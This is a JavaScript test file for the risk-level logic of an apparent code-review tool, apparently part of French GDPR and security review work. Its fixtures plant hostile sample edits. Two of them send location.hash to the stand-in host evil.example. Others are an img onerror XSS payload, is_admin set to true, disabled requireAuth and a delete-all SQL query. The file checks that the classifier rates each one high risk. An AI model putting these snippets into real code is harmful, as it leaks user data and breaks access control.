import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fixture, git } from './helpers.mjs';
import { apv, write } from './cli-helpers.mjs';
import { realAddress } from '../dist/review/risk.js';

/**
 * Risk level of `apv review plan` (src/review/risk.ts), decided by the path only: tests named as tests or under a test
 * folder, documentation and mockups without a word of data or GDPR are of low risk (security alone, fidelity for a
 * mockup); everything else is of high risk and keeps the plan of 3.0.0-alpha.14. Every bypass found by the reviews of
 * PR #110 (security, GDPR, data) is a refusal here: it must keep its domains and a high risk.
 */
const FILES = {
  'src/lib/util11.ts': 'export const util = 1;\n',
  'src/lib/promote.ts': "export const sql = 'update profiles set is_admin = false where id = $1';\n",
  'src/lib/flags.ts': 'class Flags {\n  #isAdmin = false;\n}\n',
  'src/lib/calc.ts': 'export const total = 3\n  * 1;\n',
  'src/lib/messages.ts': "export const messages = {\n  retention: 'Nous gardons vos réponses douze mois',\n  title: 'Bienvenue sur le site',\n};\n",
  'src/lib/emails/templates.ts': "export const goodbye = 'Votre compte est fermé';\n",
  'src/lib/content/sous-traitance.ts': "export const promise = 'Nos partenaires ne reçoivent rien de vous';\n",
  'src/lib/components/Guard.svelte': '<script lang="ts">\n  const config = {\n    requireAuth: true,\n    endpoint: \'/api/collect\',\n  };\n</script>\n\n<p>Montant total du mois</p>\n',
  'src/lib/components/Api.tsx': "export const call = () => fetch('/api/items', {\n  method: 'GET',\n});\n",
  'src/routes/politique-cookies/+page.svelte': '<h1>Cookies</h1>\n<p>Ce site est léger</p>\n',
  'src/lib/server/fixtures/admin.ts': "export const admin = { role: 'admin' };\n",
  'src/routes/tests/+server.ts': 'export const GET = () => new Response("ok");\n',
  'vitest.config.ts': "export default { test: { exclude: [] } };\n",
  'eslint.config.js': 'export default [];\n',
  '.apv/config.json': '{ "gates": [] }\n',
  'fixtures/users.ts': 'export const users = [];\n',
  'tests/e2e/auth.spec.ts': "import { test } from '@playwright/test';\ntest('x', async () => {});\n",
  'src/lib/server/auth/session.test.ts': "import { test } from 'vitest';\ntest('s', () => {});\n",
  'docs/guide.md': '# Guide\n',
  'docs/design/accueil.html': '<p>Maquette</p>\n',
};

function project(t, config) {
  const f = fixture(t, { files: FILES });
  if (config !== undefined) { write(f.repo, '.apv/config.json', config); git(f.repo, 'add', '.'); git(f.repo, 'commit', '-qm', 'config'); }
  git(f.repo, 'switch', '-q', '-c', 'work');
  const file = p => join(f.repo, p);
  return {
    ...f,
    edit: (path, text) => { mkdirSync(dirname(file(path)), { recursive: true }); writeFileSync(file(path), text); },
    replace: (path, a, b) => { const before = readFileSync(file(path), 'utf8'); assert.ok(before.includes(a), `${path} : ${a}`); writeFileSync(file(path), before.replace(a, b)); },
    commit: () => { git(f.repo, 'add', '-A'); git(f.repo, 'commit', '-qm', 'change'); },
    plan: async (...extra) => {
      const r = await apv(f.repo, ['review', 'plan', '--base', 'main', '--head', 'work', '--json', ...extra]);
      assert.equal(r.code, 0, r.stderr);
      return r.json();
    },
    text: async () => (await apv(f.repo, ['review', 'plan', '--base', 'main', '--head', 'work'])).stdout,
  };
}

const ALL = ['securite', 'fidelite', 'donnees', 'rgpd'];

/** Each bypass of the reviews of PR #110: the change, the domains the plan must keep, the reason of the high risk. */
const BYPASSES = [
  // Security review: code and SQL read as « text ».
  ['block comment followed by code', p => p.replace('src/lib/util11.ts', 'export const util = 1;\n', 'export const util = 1;\n/* note */ globalThis.fetch("https://evil.example/" + location.hash);\n'), ALL],
  ['UPDATE in a string', p => p.replace('src/lib/promote.ts', 'is_admin = false', 'is_admin = true'), ALL],
  ['#isAdmin read as a comment', p => p.replace('src/lib/flags.ts', '#isAdmin = false', '#isAdmin = true'), ALL],
  ['line starting with *', p => p.replace('src/lib/calc.ts', '* 1;', '* 100;'), ALL],
  ['requireAuth in a component', p => p.replace('src/lib/components/Guard.svelte', 'requireAuth: true', 'requireAuth: false'), ['securite', 'fidelite']],
  ['endpoint in a component', p => p.replace('src/lib/components/Guard.svelte', "'/api/collect'", "'https://evil.example/collect'"), ['securite', 'fidelite']],
  ['method in a tsx', p => p.replace('src/lib/components/Api.tsx', "'GET'", "'DELETE'"), ['securite', 'fidelite', 'rgpd']],
  ['HTML comment then img onerror', p => p.replace('src/lib/components/Guard.svelte', '<p>Montant total du mois</p>', '<!-- --><img src=x onerror=alert(1)>'), ['securite', 'fidelite']],
  ['text only in a component', p => p.replace('src/lib/components/Guard.svelte', 'Montant total du mois', 'Montant total de la semaine'), ['securite', 'fidelite']],
  ['server fixture (server beats tooling)', p => p.replace('src/lib/server/fixtures/admin.ts', "'admin'", "'owner'"), ALL],
  ['test runner configuration', p => p.replace('vitest.config.ts', 'exclude: []', "exclude: ['src/lib/server/auth/**']"), ALL],
  ['route under a tests folder', p => p.replace('src/routes/tests/+server.ts', '"ok"', '"ko"'), ALL],
  ['configuration of the tool (data review D1)', p => p.replace('.apv/config.json', '"gates": []', '"gates": [], "testsCheck": { "enabled": false }'), ALL],
  ['lint configuration', p => p.replace('eslint.config.js', '[]', '[{ rules: {} }]'), ALL],
  // GDPR review: what a text says of the data, and personal data in tooling.
  ['retention promise in a messages module', p => p.replace('src/lib/messages.ts', 'Nous gardons vos réponses douze mois', 'Nous conservons vos données pendant cinq ans'), ALL],
  ['hosting and processor in a messages module', p => p.replace('src/lib/messages.ts', 'Bienvenue sur le site', 'Hébergé aux États-Unis par un prestataire américain'), ALL],
  ['e-mail template', p => p.replace('src/lib/emails/templates.ts', 'Votre compte est fermé', 'Vos messages seront conservés trois ans'), ['securite', 'rgpd']],
  ['processor promise', p => p.replace('src/lib/content/sous-traitance.ts', 'Nos partenaires ne reçoivent rien de vous', 'Nos sous-traitants ne reçoivent aucune donnée vous concernant'), ALL],
  ['fixture with a real address', p => p.replace('fixtures/users.ts', '[]', "[{ name: 'Jean Dupont', mail: 'jean.dupont@gmail.com' }]"), ALL],
  ['tracker in a cookie page', p => p.replace('src/routes/politique-cookies/+page.svelte', 'Ce site est léger', "Ce site n'utilise aucun traceur"), ['securite', 'fidelite', 'rgpd']],
];

test('review risk: every bypass found by the reviews keeps its domains and a high risk (refusals)', async t => {
  for (const [name, change, domains] of BYPASSES) {
    const p = project(t);
    change(p);
    p.commit();
    const plan = await p.plan();
    assert.equal(plan.risk.level, 'eleve', `${name} : ${JSON.stringify(plan.risk)}`);
    assert.deepEqual(plan.retained, domains, name);
    assert.ok(plan.risk.files.length >= 1, name);
  }
});

test('review risk: tests, documentation and mockups are of low risk: security, plus fidelity for a mockup', async t => {
  const p = project(t);
  p.edit('tests/e2e/auth.spec.ts', "import { test } from '@playwright/test';\ntest('y', async ({ page }) => {\n  await page.fill('#login', 'demo@example.org');\n});\n");
  p.edit('src/lib/server/auth/session.test.ts', "import { test } from 'vitest';\ntest('t', () => {});\n");
  p.edit('docs/guide.md', '# Guide\n\nPlus de détails.\n');
  p.edit('README.md', '# Fixture\n\nÀ lire.\n');
  p.commit();
  let plan = await p.plan();
  assert.equal(plan.risk.level, 'faible', JSON.stringify(plan.risk));
  assert.deepEqual(plan.retained, ['securite']);
  assert.match(plan.risk.reason, /^seulement documentation \(2\) ; tests \(2\)$/);
  // A test named as a test under a sensitive and server path stays a test.
  assert.equal(plan.files.find(f => f.path === 'src/lib/server/auth/session.test.ts').risk, 'faible');
  assert.match(await p.text(), /^Risque : faible : seulement /m);
  // A mockup: fidelity joins, the level stays low.
  p.edit('docs/design/accueil.html', '<p>Maquette revue</p>\n');
  p.commit();
  plan = await p.plan();
  assert.equal(plan.risk.level, 'faible', JSON.stringify(plan.risk));
  assert.deepEqual(plan.retained, ['securite', 'fidelite']);
});

test('review risk: a word of data or GDPR makes a test or a document of high risk, with its domain', async t => {
  const p = project(t);
  p.edit('tests/e2e/auth.spec.ts', "import { test } from '@playwright/test';\ntest('y', async () => {\n  await db.query('delete from accounts');\n});\n");
  p.commit();
  let plan = await p.plan();
  assert.equal(plan.risk.level, 'eleve');
  assert.ok(plan.retained.includes('donnees'));
  const q = project(t);
  q.edit('docs/guide.md', '# Guide\n\nLes données sont hébergées en France.\n');
  q.commit();
  plan = await q.plan();
  assert.equal(plan.risk.level, 'eleve');
  assert.deepEqual(plan.retained, ['securite', 'rgpd']);
  // Markdown served by the application is not documentation.
  const r = project(t);
  r.edit('src/routes/blog/+page.md', '# Article\n');
  r.commit();
  assert.equal((await r.plan()).risk.level, 'eleve');
});

test('review risk: instructions of the agents and unclassified Markdown are of high risk, and the plan stays valid (no REVIEW_RISK)', async t => {
  for (const [path, domains] of [
    ['agents/architecte-donnees.md', ALL], ['workflows/revues.md', ALL], ['articles/premier.md', ALL], ['skills/review/SKILL.md', ALL],
    ['.apv/brief.md', ALL], ['CLAUDE.md', ALL],
  ]) {
    const p = project(t);
    p.edit(path, '# Consigne\n\nUne ligne ajoutée.\n');
    p.commit();
    const r = await apv(p.repo, ['review', 'plan', '--base', 'main', '--head', 'work', '--json']);
    assert.equal(r.code, 0, `${path} : ${r.stderr}`);
    assert.doesNotMatch(r.stderr, /REVIEW_RISK/, path);
    const plan = r.json();
    assert.equal(plan.risk.level, 'eleve', path);
    assert.deepEqual(plan.retained, domains, path);
  }
});

test('review risk: tooling outside a test folder, and tests under a routing folder, are never tests', async t => {
  for (const [path, text, domains] of [
    ['src/lib/fixtures/demo.ts', "export const demo = { role: 'owner' };\n", ALL],
    ['src/lib/__mocks__/session.ts', 'export const session = { valid: true };\n', ALL],
    ['src/routes/tests/+page.svelte', '<script>fetch("https://evil.example/" + location.hash)</script>\n', ['securite', 'fidelite']],
    ['src/routes/tests/helpers.ts', 'export const allow = true;\n', ALL],
  ]) {
    const p = project(t);
    p.edit(path, text);
    p.commit();
    const plan = await p.plan();
    assert.equal(plan.risk.level, 'eleve', path);
    assert.deepEqual(plan.retained, domains, path);
    assert.notEqual(plan.files.find(f => f.path === path).riskWhy, 'tests', path);
  }
  // Tooling under the test folder at the root of the repository: a test.
  const q = project(t);
  q.edit('tests/fixtures/users.ts', "export const users = [{ name: 'Demo' }];\n");
  q.commit();
  const plan = await q.plan();
  assert.equal(plan.risk.level, 'faible', JSON.stringify(plan.risk));
  assert.deepEqual(plan.retained, ['securite']);
  // A JSON file of the server class: « code serveur ou configuration ».
  const r = project(t);
  r.edit('.claude-plugin/plugin.json', '{ "name": "x" }\n');
  r.edit('src/lib/settings.json', '{ "a": 1 }\n');
  r.commit();
  const why = (await r.plan()).files.find(f => f.path === 'src/lib/settings.json').riskWhy;
  assert.equal(why, 'code serveur ou configuration');
});

test('review risk: --force and review.always stay above the level', async t => {
  const p = project(t, { review: { always: ['rgpd'] } });
  p.edit('docs/guide.md', '# Guide\n\nAutre.\n');
  // A test with it: outside the lane without code (documentation alone takes it, test/docs-only-lane.test.mjs).
  p.edit('tests/e2e/auth.spec.ts', "import { test } from '@playwright/test';\ntest('z', async () => {});\n");
  p.commit();
  const plan = await p.plan('--force', 'donnees');
  assert.equal(plan.risk.level, 'faible');
  assert.deepEqual(plan.retained, ['securite', 'donnees', 'rgpd']);
});

test('review risk: real e-mail addresses, unit', () => {
  assert.equal(realAddress(["mail: 'jean.dupont@gmail.com'"]), 'jean.dupont@gmail.com');
  for (const line of ["'demo@example.org'", "'a@b.example'", "'x@site.test'", "'y@app.localhost'", "'z@nope.invalid'", 'pas d\'adresse']) assert.equal(realAddress([line]), null, line);
});

test('review risk: a package with a version, an import path or a mention is no e-mail address; a real address still is', () => {
  // Pilot project, 9 October 2026: `npx -y supabase@2.117.0` in a journal kept the GDPR review.
  for (const line of [
    'npx -y supabase@2.117.0 db push', 'npm i @scope/nom@1.2.3', 'npm i @scope/nom@x.y.z', 'pnpm dlx tool@1.0.0-beta.2', 'npx outil@1.2.3-rc',
    "import { x } from '@chemin/fichier';", 'voir @chemin et @securite dans la note', 'le domaine securite@ puis @chemin.md', '![logo](img/logo@2x.png)', 'chaîne@3x.webp',
  ]) assert.equal(realAddress([line]), null, line);
  for (const [line, address] of [
    ['écrire à prenom@domaine.tld', 'prenom@domaine.tld'], ['mail: jean.dupont@gmail.com.', 'jean.dupont@gmail.com'],
    ['npx supabase@2.117.0 puis marie@societe.fr', 'marie@societe.fr'], ['contact+x@un-site.co.uk', 'contact+x@un-site.co.uk'],
  ]) assert.equal(realAddress([line]), address, line);
  // Reserved domains of examples stay out.
  for (const line of ['a@example.test', 'a@exemple.fr', 'a@example.com', 'a@example.org']) assert.equal(realAddress([line]), null, line);
});
